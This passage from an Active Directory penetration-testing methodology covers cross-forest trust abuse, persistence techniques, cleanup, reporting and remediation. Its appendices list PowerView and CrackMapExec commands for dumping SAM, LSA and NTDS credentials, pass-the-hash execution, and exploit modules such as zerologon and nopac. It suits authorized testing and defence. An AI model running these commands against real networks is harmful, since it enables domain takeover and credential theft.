In BloodHound GUI: `Analysis` → `Users with Foreign Domain Group Membership`.

## 8.8 8d — Password Reuse Across Forests

After cracking `adm_bob.smith` in Domain A, try `bsmith_admin`/`bsmith.adm`/`bob.smith_adm` in Domain B with the same password. Common pattern when same admin team manages both.

## 8.9 8e — SID History Abuse (Cross-Forest)

If SID Filtering is **disabled** on the trust (legacy migrations), and you compromise an account whose `sIDHistory` contains a high-priv SID from the other forest, you inherit those rights cross-trust. Enumerate:

```powershell
Get-DomainUser -LDAPFilter "(sIDHistory=*)" -Domain <dom>
```

Add SID History via Mimikatz (requires DA in source domain):

```powershell
mimikatz # sid::add /sam:<user> /new:<S-1-5-21-OTHER_FOREST_DA-SID>
```

## 8.10 8f — Printer Bug across forest unconstrained delegation

If forest trust allows TGT delegation **and** there's a host with unconstrained delegation in the other forest:

1. Coerce that host to authenticate to attacker via `MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx`
2. Capture forwarded TGT
3. Use TGT to act as that machine account

```bash
# Check spooler exposure on target
# (SecurityAssessment.ps1 → Get-SpoolStatus)
```

```powershell
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Triggering tools: SpoolSample, Rubeus monitor mode for forwarded tickets, krbrelayx.

---

# PHASE 9 — Persistence (Brief)

| Technique | Description | Cleanup |
|----------|-------------|---------|
| **Golden Ticket** | Forge any user TGT with KRBTGT hash | Rotate KRBTGT **twice** |
| **Silver Ticket** | Forge TGS for a single service via service account hash | Rotate that account's password |
| **Skeleton Key** | Mimikatz patches LSASS so any user logs in with master pwd "mimikatz" | Reboot DC |
| **AdminSDHolder** | Modify CN=AdminSDHolder ACL → SDProp pushes to all protected groups every 60min | Audit ACL on AdminSDHolder; remove unauthorized ACEs |
| **DCShadow** | Register fake DC, push attacker-chosen attribute changes | Audit replication metadata; reset object |
| **Shadow Credentials** | Add msDS-KeyCredentialLink to victim → use cert to get TGT | Remove the key credential |
| **DSRM Account** | Modify DSRMAdminLogonBehavior on DC → DSRM account becomes valid | Reset DSRM password, revert reg key |
| **Krbtgt Backdoor (Diamond/Sapphire ticket)** | Forge with subtle bypasses | Same as golden ticket cleanup |
| **AD CS Persistence (ESC1-ESC15)** | Issue long-life user certificates to forge TGTs | Revoke certificates; harden CA templates |
| **GPO Backdoor** | Add startup/scheduled task via GPO at low priority | Review GPO contents, remove malicious settings |

> **Real engagements**: most of these are out-of-scope without explicit authorization. **Discuss before implementing**.

---

# PHASE 10 — Cleanup, Logging, Reporting

## 10.1 Mandatory Cleanup Checklist

For every action you took, undo it (in reverse order):

- [ ] Revert any password changes (or alert client to reset to original)
- [ ] Remove yourself from any groups you added yourself to
- [ ] Delete any temporary user/computer accounts you created (incl. NoPac machine accounts!)
- [ ] Remove any SPNs you added for targeted Kerberoasting
- [ ] Revert any ACE/DACL changes
- [ ] Remove any GPO modifications (esp. SharpGPOAbuse changes that affect many computers)
- [ ] Delete any uploaded payloads / DLLs / scheduled tasks
- [ ] Drop any planted skeleton keys / DSRM backdoors / shadow credentials
- [ ] Delete `.ccache`, `.kirbi`, captured hashes from compromised hosts (keep on attack box for report)
- [ ] Note KRBTGT rotation recommendation for client (twice, with > 10 hour delay between rotations)
- [ ] Note password resets needed for cracked accounts
- [ ] Note any local admin password reuse → recommend LAPS

## 10.2 Activity Log Template

| Date | Time | Source | Target | Action | User context | Result | Cleanup status |
|------|------|--------|--------|--------|--------------|--------|----------------|
| ... | ... | attack01 | DC01 | DCSync krbtgt | adunn | Got NT hash | n/a (read-only) |
| ... | ... | MS01 | adunn | added fake SPN | damundsen | TGS captured | SPN removed YYYY-MM-DD |

## 10.3 Reporting Notes

For each finding, capture:

- **Title** (e.g., "Kerberoastable service accounts with weak passwords")
- **Risk** (calibrate: cracked = High; uncracked-but-present = Medium)
- **Affected accounts/hosts**
- **Reproduction steps** (commands the client can rerun)
- **Proof** (screenshots, hash captures, SYSTEM whoami)
- **Remediation** (specific, actionable; e.g., "Migrate svc_qualys to gMSA; rotate password to ≥25 random chars")
- **References** (CVE links, vendor advisories)

## 10.4 Post-Engagement Recommendations Catalog

| Issue | Remediation |
|-------|-------------|
| LLMNR/NBT-NS poisoning | Disable LLMNR via GPO `Computer Configuration > Policies > Admin Templates > Network > DNS Client > Turn off Multicast Name Resolution` and disable NetBIOS over TCP/IP on adapters |
| SMB null session | Disable; restrict anonymous access on legacy DCs |
| LDAP anonymous bind | Disable; require authenticated LDAP |
| Weak password policy | Increase min length to ≥14; deploy password filter (banned-words list); enable Password Protection |
| Kerberoasting | Migrate service accounts to gMSA / MSA; rotate non-managed service account passwords to long random values; restrict RC4 |
| ASREPRoasting | Audit `DONT_REQ_PREAUTH`; remove unless required; require strong passwords on remaining |
| GPP cpassword | Remove all Groups.xml/Drives.xml etc. with cpassword attribute from SYSVOL |
| Cleartext creds in shares/SYSVOL | Remove; recommend Snaffler audits |
| Excessive ACLs | Audit using BloodHound; remove unintended permissions; tier admin model |
| Local admin password reuse | Deploy LAPS / LAPSv2 |
| Password in description | Bulk audit; remove |
| PASSWD_NOTREQD | Audit; remove flag unless required |
| Unconstrained delegation | Migrate to constrained / RBCD; add admins to Protected Users |
| AD CS misconfigs (ESC1-15) | Harden templates; require manager approval; restrict enrollment |
| NoPac / PetitPotam / PrintNightmare | Patch (KB5008380, KB5005413, KB5004945+); set MachineAccountQuota=0; disable Spooler on DCs; disable NTLM auth on AD CS web enroll |
| Outdated OS | Decommission or segment legacy hosts; document risk |
| Domain trust SID History | Enable SID Filtering on external trusts; quarantine where supported |
| Exchange over-priv | Apply Exchange security update; remove WriteDACL on domain object; split-permission model |

---

# Appendix A — Useful Hashcat Modes

| Mode | Hash type |
|------|-----------|
| 1000 | NTLM |
| 1100 | Domain Cached Credentials (DCC, MS-Cache) |
| 2100 | DCC2 (mscash2) |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 (Responder) |
| 13100 | Kerberos 5 TGS-REP etype 23 (RC4 Kerberoast) |
| 19600 | TGS-REP etype 17 (AES-128) |
| 19700 | TGS-REP etype 18 (AES-256) |
| 18200 | AS-REP etype 23 (ASREPRoast) |
| 19800 | AS-REP etype 17 |
| 19900 | AS-REP etype 18 |
| 7500 | Kerberos AS-REQ etype 23 |
| 16500 | JWT |

# Appendix B — UAC Flag Decimals

| Decimal | Flag |
|---------|------|
| 2 | ACCOUNTDISABLE |
| 16 | LOCKOUT |
| 32 | PASSWD_NOTREQD |
| 64 | PASSWD_CANT_CHANGE |
| 128 | ENCRYPTED_TEXT_PWD_ALLOWED (reversible) |
| 512 | NORMAL_ACCOUNT |
| 2048 | INTERDOMAIN_TRUST_ACCOUNT |
| 4096 | WORKSTATION_TRUST_ACCOUNT |
| 8192 | SERVER_TRUST_ACCOUNT |
| 65536 | DONT_EXPIRE_PASSWORD |
| 131072 | MNS_LOGON_ACCOUNT |
| 262144 | SMARTCARD_REQUIRED |
| 524288 | TRUSTED_FOR_DELEGATION (unconstrained) |
| 1048576 | NOT_DELEGATED |
| 2097152 | USE_DES_KEY_ONLY |
| 4194304 | DONT_REQ_PREAUTH |
| 8388608 | PASSWORD_EXPIRED |
| 16777216 | TRUSTED_TO_AUTH_FOR_DELEGATION (constrained w/ protocol transition) |

LDAP filter: `(userAccountControl:1.2.840.113556.1.4.803:=<DECIMAL>)` exact match.

# Appendix C — Well-Known SIDs / RIDs

| RID | Account/Group |
|-----|---------------|
| 500 | Built-in Administrator |
| 501 | Guest |
| 502 | krbtgt |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |
| 525 | Protected Users |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |
| S-1-5-32-544 | BUILTIN\Administrators |
| S-1-5-32-551 | BUILTIN\Backup Operators |
| S-1-5-32-555 | BUILTIN\Remote Desktop Users |
| S-1-5-32-580 | BUILTIN\Remote Management Users |

# Appendix D — Useful PowerView Cheats

```powershell
# Domain-level
Get-Domain
Get-DomainController
Get-DomainPolicy
Get-DomainSID
Get-DomainTrust / Get-DomainTrustMapping / Get-ForestTrust
Get-DomainForeignUser / Get-DomainForeignGroupMember

# Users / groups
Get-DomainUser <user>
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter PASSWD_NOTREQD
Get-DomainUser -AdminCount
Get-DomainUser -TrustedToAuth                    # constrained deleg targets
Get-DomainUser -AllowDelegation                  # unconstrained
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGPO

# Computers
Get-DomainComputer
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth
Get-DomainFileServer
Get-DomainDFSShare

# ACL hunting
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectACL -Identity <obj> -ResolveGUIDs

# Sessions / local admin
Find-LocalAdminAccess
Find-DomainUserLocation -UserName <admin>
Get-NetSession -ComputerName <host>
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Management Users"
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Administrators"

# Modification (be careful, document!)
Set-DomainUserPassword -Identity <user> -AccountPassword $sec -Credential $cred
Set-DomainObject -Identity <user> -SET @{<attr>=<val>} -Credential $cred
Set-DomainObject -Identity <user> -Clear <attr> -Credential $cred
Add-DomainGroupMember -Identity <group> -Members <user> -Credential $cred
Remove-DomainGroupMember -Identity <group> -Members <user> -Credential $cred
```

# Appendix E — Useful CrackMapExec / NetExec Cheats

```bash
# Auth check / PWN sweep
crackmapexec smb 10.10.0.0/24 -u user -p pass
crackmapexec smb 10.10.0.0/24 -u user -H <NTHASH>

# Local-admin spray (ALWAYS --local-auth!)
crackmapexec smb 10.10.0.0/24 -u administrator -H <HASH> --local-auth

# Enumeration
crackmapexec smb <DC> -u u -p p --users
crackmapexec smb <DC> -u u -p p --groups
crackmapexec smb <DC> -u u -p p --pass-pol
crackmapexec smb <DC> -u u -p p --shares
crackmapexec smb <host> -u u -p p --loggedon-users
crackmapexec smb <host> -u u -p p --sessions
crackmapexec smb <host> -u u -p p --disks
crackmapexec smb <DC> -u u -p p --rid-brute 4000

# Modules
crackmapexec smb -L                              # list modules
crackmapexec smb <DC> -u u -p p -M gpp_password
crackmapexec smb <DC> -u u -p p -M gpp_autologin
crackmapexec smb <DC> -u u -p p -M lsassy
crackmapexec smb <DC> -u u -p p -M nopac
crackmapexec smb <DC> -u u -p p -M zerologon
crackmapexec smb <DC> -u u -p p -M printerbug
crackmapexec smb <DC> -u u -p p -M petitpotam

# Dumping
crackmapexec smb <host> -u administrator -H <HASH> --sam
crackmapexec smb <host> -u administrator -H <HASH> --lsa
crackmapexec smb <DC> -u administrator -H <HASH> --ntds        # DCSync if rights

# Code exec
crackmapexec smb <host> -u administrator -H <HASH> -x 'whoami'
crackmapexec smb <host> -u administrator -H <HASH> -X 'whoami /priv' --exec-method wmiexec

# Other protocols
crackmapexec winrm <host> -u u -p p
crackmapexec mssql <host> -u u -p p -q "SELECT @@version"
crackmapexec ssh <host> -u u -p p
crackmapexec ldap <host> -u u -p p --asreproast asrep.txt
crackmapexec ldap <host> -u u -p p --kerberoasting krb.txt
```

# Appendix F — Quick Tool Selector

| Need | Linux | Windows |
|------|-------|---------|
| Username enum (no creds) | kerbrute, enum4linux-ng, rpcclient null | dsquery, net.exe |
| Hash capture | Responder | Inveigh |
| Password spray | kerbrute, CME, rpcclient loop | DomainPasswordSpray |
| Build target list | linkedin2username + statistically-likely-usernames | same |
| Domain map | bloodhound-python + smbmap + windapsearch | SharpHound + PowerView |
| Kerberoast | GetUserSPNs.py | Rubeus |
| ASREPRoast | GetNPUsers.py / kerbrute | Rubeus |
| ACL abuse | bloodyAD, pth-net, targetedKerberoast.py | PowerView |
| DCSync | secretsdump.py | mimikatz lsadump::dcsync |
| Pass-the-Hash | impacket *exec.py, evil-winrm -H | mimikatz pth, evil-winrm |
| Pass-the-Ticket | KRB5CCNAME + impacket -k | Rubeus ptt |
| Lateral cmd exec | psexec.py / wmiexec.py | PsExec / Invoke-Command |
| WinRM shell | evil-winrm | Enter-PSSession |
| MSSQL | mssqlclient.py | PowerUpSQL |
| Share secrets | smbmap, manual grep | Snaffler |
| GPP decrypt | gpp-decrypt | Get-GPPPassword.ps1 |
| Forge tickets | ticketer.py | mimikatz, Rubeus |
| AD CS attacks | certipy | Certify.exe |
| NoPac | noPac.py | noPac.exe ports exist |
| PrintNightmare | CVE-2021-1675.py (cube0x0 impacket) | SharpPrintNightmare.exe |
| PetitPotam | PetitPotam.py + ntlmrelayx.py + PKINITtools | Mimikatz misc::efs / Invoke-PetitPotam |
| LDAP DNS dump | adidnsdump | manual ADSI |

# Appendix G — Common Engagement Pitfalls

1. **Account lockouts** during password spraying — always validate policy first; never spray without throttle.
2. Running NoPac without checking → temporary computer account left in domain.
3. Adding fake SPN for targeted Kerberoast → forgotten cleanup.
4. Resetting a user's password → user can't log in next morning → angry helpdesk call. Always coordinate.
5. Pulling NTDS without secure transport → NTLM hashes in flight to attack box, in tester's notes; encrypt at rest.
6. Running SharpHound `-c All` against massive enterprise → enormous load + alarm noise. Use `--stealth` (DCOnly) for first pass.
7. Forgetting `--local-auth` flag → local admin spray converts to domain spray → instant lockout storm.
8. Cracking AS-REP with the wrong hashcat mode (18200 vs 19900) → hours wasted.
9. Performing ACL/GPO changes that affect entire OUs of users/computers without checking impact scope first.
10. PrintNightmare DLL crashes spooler on production server → printing outage. Test only with approval.
11. Running raiseChild.py / "autopwn" tools blindly → if it fails midway, you don't understand what state was left behind.
12. Forgetting the Kerberos Double Hop limitation → wasted time debugging "credential" errors on second hops.
13. Passing `MachineAccountQuota=10` users → may add too many computer accounts and exhaust the quota.

---

# Final Iteration Reminder

```
                  ┌─────────────────────────────┐
                  │ Got new credential / right? │
                  └──────────────┬──────────────┘
                                 │
                                 ▼
                  ┌─────────────────────────────┐
                  │ Re-run Phase 4 enumeration  │
                  │  AS THE NEW IDENTITY        │
                  └──────────────┬──────────────┘
                                 │
                ┌────────────────┼────────────────┐
                ▼                ▼                ▼
        Phase 5 (privesc)  Phase 6 (lateral)  Phase 8 (trust)
                │                │                │
                └────────────────┼────────────────┘
                                 ▼
                  ┌─────────────────────────────┐
                  │ Reach DA / EA / Forest root │
                  │  → Phase 7 + Phase 10       │
                  └─────────────────────────────┘
```

**Every credential is a new perspective. Every host is a new vantage. Loop, log, escalate.**
